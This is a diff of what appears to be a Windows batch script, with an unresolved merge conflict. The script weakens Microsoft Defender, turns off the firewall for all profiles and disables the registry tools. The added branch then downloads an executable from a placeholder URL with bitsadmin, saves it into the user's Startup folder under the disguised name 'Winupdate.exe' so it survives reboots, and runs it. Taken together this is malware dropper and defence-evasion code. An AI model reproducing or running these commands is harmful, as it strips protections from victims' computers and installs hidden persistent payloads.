@@ -91,4 +91,14 @@ powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
 powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
+<<<<<<< HEAD
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
+=======
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
+
+bitsadmin /transfer Packages /download /priority foreground https://Link-to-exe-here "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
+
+cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+powershell -command "start Winupdate.exe"
+>>>>>>> d0b3e66b5867cbcd600d0de24cae28ea5447f960
